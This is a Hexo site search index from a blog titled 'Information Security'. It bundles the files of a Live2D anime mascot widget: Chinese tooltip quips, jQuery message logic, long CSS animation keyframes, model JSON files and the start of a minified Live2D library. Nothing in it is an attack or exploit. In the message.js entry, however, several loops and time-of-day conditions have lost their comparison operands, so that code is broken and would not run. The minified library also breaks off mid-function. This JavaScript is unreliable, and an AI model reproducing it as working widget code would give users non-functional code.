{"meta":{"title":"Kiona","subtitle":null,"description":"Information Security","author":"Kiona","url":"https://kkkiona.github.io","root":"/"},"pages":[{"title":"","date":"2019-04-13T11:26:21.246Z","updated":"2018-03-23T12:55:42.000Z","comments":true,"path":"live2d/message.json","permalink":"https://kkkiona.github.io/live2d/message.json","excerpt":"","text":"{\"mouseover\":[{\"selector\":\"#showInfoBtn\",\"text\":[\"查看最新吐槽和站内信息\"]},{\"selector\":\"#showTalkBtn\",\"text\":[\"要和我聊天吗？\"]},{\"selector\":\"#hideButton\",\"text\":[\"隐藏伊斯特瓦尔，希望隐藏后我们还能再见面！\"]},{\"selector\":\"#musicButton\",\"text\":[\"给页面加点音乐吗？\"]},{\"selector\":\"#youduButton\",\"text\":[\"按钮有毒，癫痫患者不要开启！！！点一下开启，再点一下可以关闭。\"]},{\"selector\":\".itemarticle-tips a\",\"text\":[\"要看看 {text} 么？\"]},{\"selector\":\".searchbox\",\"text\":[\"在找什么东西呢，需要帮忙吗？\"]}],\"click\":[{\"selector\":\"#landlord #live2d\",\"text\":[\"不要动手动脚的！快把手拿开~~\",\"真…真的是不知羞耻！\",\"Hentai！\",\"再摸的话我可要报警了！\",\"110吗，这里有个变态！\"]}]}"},{"title":"","date":"2019-04-13T11:26:21.246Z","updated":"2018-03-23T12:55:42.000Z","comments":true,"path":"live2d/js/message.js","permalink":"https://kkkiona.github.io/live2d/js/message.js","excerpt":"","text":"var home_Path = document.location.protocol +'//' + window.document.location.hostname +'/'; var userAgent = window.navigator.userAgent.toLowerCase(); console.log(userAgent); var norunAI = [ \"android\", \"iphone\", \"ipod\", \"ipad\", \"windows phone\", \"mqqbrowser\" ,\"msie\",\"trident/7.0\"]; var norunFlag = false; for(var i=0;i -1){ norunFlag = true; break; } } if(!window.WebGLRenderingContext){ norunFlag = true; } if(!norunFlag){ var hitFlag = false; var AIFadeFlag = false; var liveTlakTimer = null; var sleepTimer_ = null; var AITalkFlag = false; var talkNum = 0; (function (){ function renderTip(template, context) { var tokenReg = /(\\\\)?\\{([^\\{\\}\\\\]+)(\\\\)?\\}/g; return template.replace(tokenReg, function (word, slash1, token, slash2) { if (slash1 || slash2) { return word.replace('\\\\', ''); } var variables = token.replace(/\\s/g, '').split('.'); var currentObject = context; var i, length, variable; for (i = 0, length = variables.length; i < length; ++i) { variable = variables[i]; currentObject = currentObject[variable]; if (currentObject === undefined || currentObject === null) return ''; } return currentObject; }); } String.prototype.renderTip = function (context) { return renderTip(this, context); }; var re = /x/; re.toString = function() { showMessage('哈哈，你打开了控制台，是想要看看我的秘密吗？', 5000); return ''; }; $(document).on('copy', function (){ showMessage('你都复制了些什么呀，转载要记得加上出处哦~~', 5000); }); function initTips(){ $.ajax({ cache: true, url: message_Path+'message.json', dataType: \"json\", success: function (result){ $.each(result.mouseover, function (index, tips){ $(tips.selector).mouseover(function (){ var text = tips.text; if(Array.isArray(tips.text)) text = tips.text[Math.floor(Math.random() * tips.text.length + 1)-1]; text = text.renderTip({text: $(this).text()}); showMessage(text, 3000); talkValTimer(); clearInterval(liveTlakTimer); liveTlakTimer = null; }); $(tips.selector).mouseout(function (){ showHitokoto(); if(liveTlakTimer == null){ liveTlakTimer = window.setInterval(function(){ showHitokoto(); },15000); }; }); }); $.each(result.click, function (index, tips){ $(tips.selector).click(function (){ if(hitFlag){ return false } hitFlag = true; setTimeout(function(){ hitFlag = false; },8000); var text = tips.text; if(Array.isArray(tips.text)) text = tips.text[Math.floor(Math.random() * tips.text.length + 1)-1]; text = text.renderTip({text: $(this).text()}); showMessage(text, 3000); }); clearInterval(liveTlakTimer); liveTlakTimer = null; if(liveTlakTimer == null){ liveTlakTimer = window.setInterval(function(){ showHitokoto(); },15000); }; }); } }); } initTips(); var text; if(document.referrer !== ''){ var referrer = document.createElement('a'); referrer.href = document.referrer; text = '嗨！来自 ' + referrer.hostname + ' 的朋友！'; var domain = referrer.hostname.split('.')[1]; if (domain == 'baidu') { text = '嗨！ 来自 百度搜索 的朋友！欢迎访问「 ' + document.title.split(' - ')[0] + ' 」'; }else if (domain == 'so') { text = '嗨！ 来自 360搜索 的朋友！欢迎访问「 ' + document.title.split(' - ')[0] + ' 」'; }else if (domain == 'google') { text = '嗨！ 来自 谷歌搜索 的朋友！欢迎访问「 ' + document.title.split(' - ')[0] + ' 」'; } }else { if (window.location.href == home_Path) { //主页URL判断，需要斜杠结尾 var now = (new Date()).getHours(); if (now > 23 || now 5 && now 7 && now 11 && now 14 && now 17 && now 19 && now 21 && now 0){ window.getSelection().removeAllRanges(); } document.onmousemove = function(){ if(moveable){ var ent = getEvent(); var x = moveLeft + ent.clientX - moveX; var y = moveBottom + (moveY - ent.clientY); obj.style.left = x + \"px\"; obj.style.bottom = y + \"px\"; } }; document.onmouseup = function(){ if(moveable){ var historywidth = obj.style.left; var historyheight = obj.style.bottom; historywidth = historywidth.replace('px', ''); historyheight = historyheight.replace('px', ''); sessionStorage.setItem(\"historywidth\", historywidth); sessionStorage.setItem(\"historyheight\", historyheight); document.onmousemove = docMouseMoveEvent; document.onmouseup = docMouseUpEvent; moveable = false; moveX = 0; moveY = 0; moveBottom = 0; moveLeft = 0; } }; }; } $(document).ready(function() { var AIimgSrc = [ home_Path + message_Path + \"model/histoire/histoire.1024/texture_00.png\", home_Path + message_Path + \"model/histoire/histoire.1024/texture_01.png\", home_Path + message_Path + \"model/histoire/histoire.1024/texture_02.png\", home_Path + message_Path + \"model/histoire/histoire.1024/texture_03.png\" ] var images = []; var imgLength = AIimgSrc.length; var loadingNum = 0; for(var i=0;i"},{"title":"","date":"2019-04-13T11:26:21.238Z","updated":"2018-03-23T12:55:42.000Z","comments":true,"path":"live2d/css/live2d.css","permalink":"https://kkkiona.github.io/live2d/css/live2d.css","excerpt":"","text":"#landlord { user-select: none; position: fixed; left: 5px; bottom: 0; width: 250px; height: 280px; z-index: 10000; font-size: 0; /*transition: all .3s ease-in-out;*/ display:none; } #open_live2d{ border: 2px solid rgba(75,127,199,0.9); border-radius: 2px; background-color: rgba(74, 59, 114,0.9); padding:2px 10px; color:#fff; height:24px; line-height:24px; font-size:12px; position:fixed; right:5px; bottom:5px; z-index:10000; cursor:pointer; display:none; } #showInfoBtn{ display:none; } #live2d { width: 250px; height: 280px; position: relative; z-index:3; } .message { opacity: 0; color: #fff; box-sizing: border-box; width: 250px; height: auto; margin: auto; padding: 7px; bottom: 280px; left: 0px; text-align: center; border: 2px solid rgba(75,127,199,0.9); border-radius: 5px; background-color: rgba(74, 59, 114,0.9); font-size: 13px; font-weight: 400; text-overflow: ellipsis; text-transform: uppercase; overflow: hidden; position: absolute; /*animation-delay: 5s; animation-duration: 50s; animation-iteration-count: infinite; animation-name: shake; animation-timing-function: ease-in-out;*/ } .live_talk_input_body{ position:absolute; bottom:15px; left:0; width:250px; display:none; z-index:4; } .live_talk_input_text_body{ width:250px; box-sizing:border-box; height:28px; border: 2px solid rgb(223, 179, 241); border-radius: 5px; background-color: rgba(74, 59, 114,0.9); } .live_talk_input_name_body{ width:70px; box-sizing:border-box; height:24px; border: 2px solid rgb(223, 179, 241); border-radius: 5px; background-color: rgba(74, 59, 114,0.9); margin-bottom:3px; } .live_talk_name{ background-color:transparent; border:0px; margin:0; width:66px; height:20px; line-height:20px; text-align:center; font-size:12px; color:#fff; outline:none; box-sizing:border-box; padding:0 3px; } .live_talk_talk{ background-color:transparent; border:0px; margin:0; width:206px; height:24px; line-height:24px; text-align:left; font-size:12px; color:#fff; outline:none; box-sizing:border-box; padding:0 3px; float:left; } .live_talk_send_btn{ background-color:transparent; color:#fff; border:0px; cursor:pointer; padding:0 4px; border-left:1px solid #fff; font-size:12px; float:right; height:18px; line-height:18px; outline:none; margin:3px 0 0 0; } .white_input:-moz-placeholder { /* Mozilla Firefox 4 to 18 */ color: #E4E4E4; opacity: 1; } .white_input::-moz-placeholder { /* Mozilla Firefox 19+*/ color: #E4E4E4; opacity: 1; } .white_input:-ms-input-placeholder { color: #E4E4E4; } .white_input::-webkit-input-placeholder { color: #E4E4E4; } .hide-button { position: absolute; top: 10px; right: 0; /* bottom: 30px; */ display: none; overflow: hidden; /* padding: 4px; */ width: 60px; height: 20px; border: 1px solid rgba(255,137,255,.4); border-radius: 12px; background: rgba(255,137,255,.2); box-shadow: 0 3px 15px 2px rgba(255,137,255,.4); text-align: center; font-size: 12px; cursor: pointer; } .hide-button:hover { border: 1px solid #f4a7b9; background: #f4f6f8; } .live_ico_box{ width:15px; position:absolute; z-index:5; right:0; top:10px; opacity:0.9; } .live_ico_item{ width:15px; height: 20px; cursor:pointer; background-position:center center; background-repeat:no-repeat; background-size:15px; } .live_ico_item.type_talk{ background-image:url(../images/talk.png); } .live_ico_item.type_quit{ background-image:url(../images/quite.png); } .live_ico_item.type_info{ background-image:url(../images/info.png); } .live_ico_item.type_music{ background-image:url(../images/music.png); } .live_ico_item.type_youdu{ background-image:url(../images/youdu.png); } .live_ico_item.type_music.play{ background-image:url(../images/pasue.png); } .live_ico_item.type_youdu.doudong{ -webkit-animation-name: shake-little; -ms-animation-name: shake-little; animation-name: shake-little; -webkit-animation-duration: 100ms; -ms-animation-duration: 100ms; animation-duration: 100ms; -webkit-animation-iteration-count: infinite; -ms-animation-iteration-count: infinite; animation-iteration-count: infinite; -webkit-animation-timing-function: ease-in-out; -ms-animation-timing-function: ease-in-out; animation-timing-function: ease-in-out; -webkit-animation-delay: 0s; -ms-animation-delay: 0s; animation-delay: 0s; -webkit-animation-play-state: running; -ms-animation-play-state: running; animation-play-state: running } .douqilai,.douqilai *{ animation: shake-it .5s reverse infinite cubic-bezier(0.68, -0.55, 0.27, 1.55); } .l2d_caihong{ animation: rainbow 1.5s infinite; } @media (max-width: 860px) { #landlord { display: none!important; } } @keyframes shake { 2% { transform: translate(0.5px, -1.5px) rotate(-0.5deg); } 4% { transform: translate(0.5px, 1.5px) rotate(1.5deg); } 6% { transform: translate(1.5px, 1.5px) rotate(1.5deg); } 8% { transform: translate(2.5px, 1.5px) rotate(0.5deg); } 10% { transform: translate(0.5px, 2.5px) rotate(0.5deg); } 12% { transform: translate(1.5px, 1.5px) rotate(0.5deg); } 14% { transform: translate(0.5px, 0.5px) rotate(0.5deg); } 16% { transform: translate(-1.5px, -0.5px) rotate(1.5deg); } 18% { transform: translate(0.5px, 0.5px) rotate(1.5deg); } 20% { transform: translate(2.5px, 2.5px) rotate(1.5deg); } 22% { transform: translate(0.5px, -1.5px) rotate(1.5deg); } 24% { transform: translate(-1.5px, 1.5px) rotate(-0.5deg); } 26% { transform: translate(1.5px, 0.5px) rotate(1.5deg); } 28% { transform: translate(-0.5px, -0.5px) rotate(-0.5deg); } 30% { transform: translate(1.5px, -0.5px) rotate(-0.5deg); } 32% { transform: translate(2.5px, -1.5px) rotate(1.5deg); } 34% { transform: translate(2.5px, 2.5px) rotate(-0.5deg); } 36% { transform: translate(0.5px, -1.5px) rotate(0.5deg); } 38% { transform: translate(2.5px, -0.5px) rotate(-0.5deg); } 40% { transform: translate(-0.5px, 2.5px) rotate(0.5deg); } 42% { transform: translate(-1.5px, 2.5px) rotate(0.5deg); } 44% { transform: translate(-1.5px, 1.5px) rotate(0.5deg); } 46% { transform: translate(1.5px, -0.5px) rotate(-0.5deg); } 48% { transform: translate(2.5px, -0.5px) rotate(0.5deg); } 50% { transform: translate(-1.5px, 1.5px) rotate(0.5deg); } 52% { transform: translate(-0.5px, 1.5px) rotate(0.5deg); } 54% { transform: translate(-1.5px, 1.5px) rotate(0.5deg); } 56% { transform: translate(0.5px, 2.5px) rotate(1.5deg); } 58% { transform: translate(2.5px, 2.5px) rotate(0.5deg); } 60% { transform: translate(2.5px, -1.5px) rotate(1.5deg); } 62% { transform: translate(-1.5px, 0.5px) rotate(1.5deg); } 64% { transform: translate(-1.5px, 1.5px) rotate(1.5deg); } 66% { transform: translate(0.5px, 2.5px) rotate(1.5deg); } 68% { transform: translate(2.5px, -1.5px) rotate(1.5deg); } 70% { transform: translate(2.5px, 2.5px) rotate(0.5deg); } 72% { transform: translate(-0.5px, -1.5px) rotate(1.5deg); } 74% { transform: translate(-1.5px, 2.5px) rotate(1.5deg); } 76% { transform: translate(-1.5px, 2.5px) rotate(1.5deg); } 78% { transform: translate(-1.5px, 2.5px) rotate(0.5deg); } 80% { transform: translate(-1.5px, 0.5px) rotate(-0.5deg); } 82% { transform: translate(-1.5px, 0.5px) rotate(-0.5deg); } 84% { transform: translate(-0.5px, 0.5px) rotate(1.5deg); } 86% { transform: translate(2.5px, 1.5px) rotate(0.5deg); } 88% { transform: translate(-1.5px, 0.5px) rotate(1.5deg); } 90% { transform: translate(-1.5px, -0.5px) rotate(-0.5deg); } 92% { transform: translate(-1.5px, -1.5px) rotate(1.5deg); } 94% { transform: translate(0.5px, 0.5px) rotate(-0.5deg); } 96% { transform: translate(2.5px, -0.5px) rotate(-0.5deg); } 98% { transform: translate(-1.5px, -1.5px) rotate(-0.5deg); } 0%, 100% { transform: translate(0, 0) rotate(0); } } @keyframes quan { 0% { transform:rotate(0); animation-timing-function:linear; } 100% { transform:rotate(360deg); } } @-webkit-keyframes quan { 0% { -webkit-transform:rotate(0); -webkit-animation-timing-function:linear; } 100% { -webkit-transform:rotate(360deg); } } @-moz-keyframes quan { 0% { -moz-transform:rotate(0); -moz-animation-timing-function:linear; } 100% { -moz-transform:rotate(360deg); } } @-o-keyframes quan { 0% { -o-transform:rotate(0); -o-animation-timing-function:linear; } 100% { -o-transform:rotate(360deg); } } @-ms-keyframes quan { 0% { -ms-transform:rotate(0); -ms-animation-timing-function:linear; } 100% { -ms-transform:rotate(360deg); } } @-webkit-keyframes shake-little { 0% { -webkit-transform: translate(0px, 0px) rotate(0deg) } 2% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 4% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 6% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 8% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 10% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 12% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 14% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 16% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 18% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 20% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 22% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 24% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 26% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 28% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 30% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 32% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 34% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 36% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 38% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 40% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 42% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 44% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 46% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 48% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 50% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 52% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 54% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 56% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 58% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 60% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 62% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 64% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 66% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 68% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 70% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 72% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 74% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 76% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 78% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 80% { -webkit-transform: translate(0px, -1px) rotate(-0.5deg) } 82% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 84% { -webkit-transform: translate(-1px, 0px) rotate(-0.5deg) } 86% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 88% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 90% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 92% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 94% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } 96% { -webkit-transform: translate(-1px, -1px) rotate(-0.5deg) } 98% { -webkit-transform: translate(0px, 0px) rotate(-0.5deg) } } @-ms-keyframes shake-little { 0% { -ms-transform: translate(0px, 0px) rotate(0deg) } 2% { -ms-transform: translate(0px, 0px) rotate(-0.5deg) } 4% { -ms-transform: translate(0px, 0px) rotate(-0.5deg) } 6% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 8% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 10% { -ms-transform: translate(0px, 0px) rotate(-0.5deg) } 12% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 14% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 16% { -ms-transform: translate(0px, 0px) rotate(-0.5deg) } 18% { -ms-transform: translate(0px, 0px) rotate(-0.5deg) } 20% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 22% { -ms-transform: translate(-1px, -1px) rotate(-0.5deg) } 24% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 26% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 28% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 30% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 32% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 34% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 36% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 38% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 40% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 42% { -ms-transform: translate(-1px, -1px) rotate(-0.5deg) } 44% { -ms-transform: translate(-1px, -1px) rotate(-0.5deg) } 46% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 48% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 50% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 52% { -ms-transform: translate(-1px, -1px) rotate(-0.5deg) } 54% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 56% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 58% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 60% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 62% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 64% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 66% { -ms-transform: translate(-1px, -1px) rotate(-0.5deg) } 68% { -ms-transform: translate(0px, 0px) rotate(-0.5deg) } 70% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 72% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 74% { -ms-transform: translate(-1px, -1px) rotate(-0.5deg) } 76% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 78% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 80% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 82% { -ms-transform: translate(-1px, -1px) rotate(-0.5deg) } 84% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 86% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 88% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 90% { -ms-transform: translate(-1px, -1px) rotate(-0.5deg) } 92% { -ms-transform: translate(0px, 0px) rotate(-0.5deg) } 94% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } 96% { -ms-transform: translate(-1px, 0px) rotate(-0.5deg) } 98% { -ms-transform: translate(0px, -1px) rotate(-0.5deg) } } @keyframes shake-little { 0% { transform: translate(0px, 0px) rotate(0deg) } 2% { transform: translate(-1px, -1px) rotate(-0.5deg) } 4% { transform: translate(-1px, -1px) rotate(-0.5deg) } 6% { transform: translate(0px, 0px) rotate(-0.5deg) } 8% { transform: translate(0px, -1px) rotate(-0.5deg) } 10% { transform: translate(-1px, -1px) rotate(-0.5deg) } 12% { transform: translate(0px, 0px) rotate(-0.5deg) } 14% { transform: translate(0px, 0px) rotate(-0.5deg) } 16% { transform: translate(0px, -1px) rotate(-0.5deg) } 18% { transform: translate(0px, 0px) rotate(-0.5deg) } 20% { transform: translate(-1px, -1px) rotate(-0.5deg) } 22% { transform: translate(-1px, -1px) rotate(-0.5deg) } 24% { transform: translate(-1px, -1px) rotate(-0.5deg) } 26% { transform: translate(-1px, 0px) rotate(-0.5deg) } 28% { transform: translate(0px, -1px) rotate(-0.5deg) } 30% { transform: translate(0px, -1px) rotate(-0.5deg) } 32% { transform: translate(0px, 0px) rotate(-0.5deg) } 34% { transform: translate(0px, -1px) rotate(-0.5deg) } 36% { transform: translate(-1px, 0px) rotate(-0.5deg) } 38% { transform: translate(-1px, -1px) rotate(-0.5deg) } 40% { transform: translate(0px, 0px) rotate(-0.5deg) } 42% { transform: translate(-1px, -1px) rotate(-0.5deg) } 44% { transform: translate(-1px, 0px) rotate(-0.5deg) } 46% { transform: translate(-1px, -1px) rotate(-0.5deg) } 48% { transform: translate(0px, -1px) rotate(-0.5deg) } 50% { transform: translate(0px, -1px) rotate(-0.5deg) } 52% { transform: translate(0px, 0px) rotate(-0.5deg) } 54% { transform: translate(-1px, 0px) rotate(-0.5deg) } 56% { transform: translate(0px, 0px) rotate(-0.5deg) } 58% { transform: translate(0px, 0px) rotate(-0.5deg) } 60% { transform: translate(0px, 0px) rotate(-0.5deg) } 62% { transform: translate(0px, -1px) rotate(-0.5deg) } 64% { transform: translate(0px, 0px) rotate(-0.5deg) } 66% { transform: translate(-1px, -1px) rotate(-0.5deg) } 68% { transform: translate(0px, -1px) rotate(-0.5deg) } 70% { transform: translate(0px, 0px) rotate(-0.5deg) } 72% { transform: translate(-1px, -1px) rotate(-0.5deg) } 74% { transform: translate(-1px, -1px) rotate(-0.5deg) } 76% { transform: translate(-1px, 0px) rotate(-0.5deg) } 78% { transform: translate(0px, 0px) rotate(-0.5deg) } 80% { transform: translate(0px, -1px) rotate(-0.5deg) } 82% { transform: translate(-1px, 0px) rotate(-0.5deg) } 84% { transform: translate(-1px, -1px) rotate(-0.5deg) } 86% { transform: translate(0px, -1px) rotate(-0.5deg) } 88% { transform: translate(0px, 0px) rotate(-0.5deg) } 90% { transform: translate(-1px, -1px) rotate(-0.5deg) } 92% { transform: translate(-1px, 0px) rotate(-0.5deg) } 94% { transform: translate(-1px, 0px) rotate(-0.5deg) } 96% { transform: translate(0px, -1px) rotate(-0.5deg) } 98% { transform: translate(0px, -1px) rotate(-0.5deg) } } @keyframes shake-it{ 0%{ text-shadow: 0 0 rgba(0, 255, 255, .5), 0 0 rgba(255, 0, 0, .5); } 25%{ text-shadow: -2px 0 rgba(0, 255, 255, .5), 2px 0 rgba(255, 0, 0, .5); } 50%{ text-shadow: -5px 0 rgba(0, 255, 255, .5), 3px 0 rgba(255, 0, 0, .5); } 100%{ text-shadow: 3px 0 rgba(0, 255, 255, .5), 5px 0 rgba(255, 0, 0, .5); } } @keyframes rainbow { 100% { filter: hue-rotate(360deg); } }"},{"title":"","date":"2019-04-13T11:26:21.313Z","updated":"2018-03-23T12:55:42.000Z","comments":true,"path":"live2d/model/nep/model.json","permalink":"https://kkkiona.github.io/live2d/model/nep/model.json","excerpt":"","text":"{\"version\":\"1.0.0\",\"model\":\"model.moc\",\"textures\":[\"histoire.1024/0.png\",\"histoire.1024/1.png\",\"histoire.1024/normal_2.png\"],\"layout\":{\"center_x\":0,\"center_y\":-0.05,\"width\":2},\"hit_areas_custom\":{\"head_x\":[-1,1],\"head_y\":[1,-1],\"body_x\":[-1,-1],\"body_y\":[1,-1]},\"motions\":{\"idle\":[{\"file\":\"motions/idle/idle_00.mtn\"},{\"file\":\"motions/idle/idle_01.mtn\"},{\"file\":\"motions/idle/idle_02.mtn\"}],\"sleepy\":[{\"file\":\"motions/tap/shake.mtn\"}],\"flick_head\":[{\"file\":\"motions/tap/refuse.mtn\"},{\"file\":\"motions/tap/nep_slide_head_2.mtn\"},{\"file\":\"motions/tap/nep_touch_belly_2.mtn\"},{\"file\":\"motions/tap/nep_touch_boobs_1.mtn\"}],\"tap_body\":[{\"file\":\"motions/tap/smile.mtn\"}],\"talk\":[{\"file\":\"motions/tap/nep_touch_belly_1.mtn\"},{\"file\":\"motions/tap/nep_slide_head_2.mtn\"},{\"file\":\"motions/tap/nep_touch_head_1.mtn\"}],\"rest\":[{\"file\":\"motions/tap/tilt_head.mtn\"},{\"file\":\"motions/idle/idle_00.mtn\"},{\"file\":\"motions/idle/idle_01.mtn\"},{\"file\":\"motions/idle/idle_02.mtn\"}],\"\":[{\"file\":\"motions/tap/nep_touch_belly_1.mtn\"},{\"file\":\"motions/tap/nep_slide_head_2.mtn\"},{\"file\":\"motions/tap/nep_touch_head_1.mtn\"},{\"file\":\"motions/tap/nep_touch_boobs_1.mtn\"}]}}"},{"title":"","date":"2019-04-13T11:26:21.264Z","updated":"2018-03-23T12:55:42.000Z","comments":true,"path":"live2d/model/histoire/model.json","permalink":"https://kkkiona.github.io/live2d/model/histoire/model.json","excerpt":"","text":"{\"version\":\"1.0.0\",\"model\":\"model.moc\",\"textures\":[\"histoire.1024/texture_00.png\",\"histoire.1024/texture_01.png\",\"histoire.1024/texture_02.png\",\"histoire.1024/texture_03.png\"],\"layout\":{\"center_x\":0,\"center_y\":-0.05,\"width\":2},\"hit_areas_custom\":{\"head_x\":[-1,1],\"head_y\":[1,-1],\"body_x\":[-1,-1],\"body_y\":[1,-1]},\"motions\":{\"idle\":[{\"file\":\"motions/idle/NOZOMU_M01.mtn\"},{\"file\":\"motions/idle/NOZOMU_M02.mtn\"}],\"sleepy\":[{\"file\":\"motions/idle/NOZOMU_M04.mtn\"}],\"flick_head\":[{\"file\":\"motions/tap/DK_NOZOMU_0011.mtn\"},{\"file\":\"motions/tap/tsumiki_m_14.mtn\"},{\"file\":\"motions/tap/m_06.mtn\"}],\"tap_body\":[{\"file\":\"motions/tap/DK_NOZOMU_0011.mtn\"},{\"file\":\"motions/tap/m_13.mtn\"}],\"talk\":[{\"file\":\"motions/tap/DK_NOZOMU_0041.mtn\"},{\"file\":\"motions/tap/DK_NOZOMU_0061.mtn\"},{\"file\":\"motions/tap/DK_NOZOMU_0067.mtn\"}],\"rest\":[{\"file\":\"motions/tap/tsumiki_m_01.mtn\"},{\"file\":\"motions/tap/tsumiki_m_09.mtn\"},{\"file\":\"motions/tap/tsumiki_m_13.mtn\"},{\"file\":\"motions/tap/tsumiki_m_19.mtn\"},{\"file\":\"motions/tap/tsumiki_m_21.mtn\"}],\"\":[{\"file\":\"motions/tap/tsumiki_m_01.mtn\"},{\"file\":\"motions/tap/tsumiki_m_09.mtn\"},{\"file\":\"motions/tap/tsumiki_m_13.mtn\"},{\"file\":\"motions/tap/tsumiki_m_19.mtn\"},{\"file\":\"motions/tap/tsumiki_m_21.mtn\"}]}}"},{"title":"","date":"2019-04-13T11:26:21.245Z","updated":"2018-03-23T12:55:42.000Z","comments":true,"path":"live2d/js/live2d.js","permalink":"https://kkkiona.github.io/live2d/js/live2d.js","excerpt":"","text":"!function(t){function e(r){if(i[r])return i[r].exports;var o=i[r]={i:r,l:!1,exports:{}};return t[r].call(o.exports,o,o.exports,e),o.l=!0,o.exports}var i={};e.m=t,e.c=i,e.d=function(t,i,r){e.o(t,i)||Object.defineProperty(t,i,{configurable:!1,enumerable:!0,get:r})},e.n=function(t){var i=t&&t.__esModule?function(){return t.default}:function(){return t};return e.d(i,\"a\",i),i},e.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},e.p=\"\",e(e.s=4)}([function(t,e,i){\"use strict\";function r(){this.live2DModel=null,this.modelMatrix=null,this.eyeBlink=null,this.physics=null,this.pose=null,this.debugMode=!1,this.initialized=!1,this.updating=!1,this.alpha=1,this.accAlpha=0,this.lipSync=!1,this.lipSyncValue=0,this.accelX=0,this.accelY=0,this.accelZ=0,this.dragX=0,this.dragY=0,this.startTimeMSec=null,this.mainMotionManager=new h,this.expressionManager=new h,this.motions={},this.expressions={},this.isTexLoaded=!1}function o(){AMotion.prototype.constructor.call(this),this.paramList=new Array}function n(){this.id=\"\",this.type=-1,this.value=null}function s(){this.nextBlinkTime=null,this.stateStartTime=null,this.blinkIntervalMsec=null,this.eyeState=g.STATE_FIRST,this.blinkIntervalMsec=4e3,this.closingMotionMsec=100,this.closedMotionMsec=50,this.openingMotionMsec=150,this.closeIfZero=!0,this.eyeID_L=\"PARAM_EYE_L_OPEN\",this.eyeID_R=\"PARAM_EYE_R_OPEN\"}function _(){this.tr=new Float32Array(16),this.identity()}function a(t,e){_.prototype.constructor.call(this),this.width=t,this.height=e}function h(){MotionQueueManager.prototype.constructor.call(this),this.currentPriority=null,this.reservePriority=null,this.super=MotionQueueManager.prototype}function l(){this.physicsList=new Array,this.startTimeMSec=UtSystem.getUserTimeMSec()}function 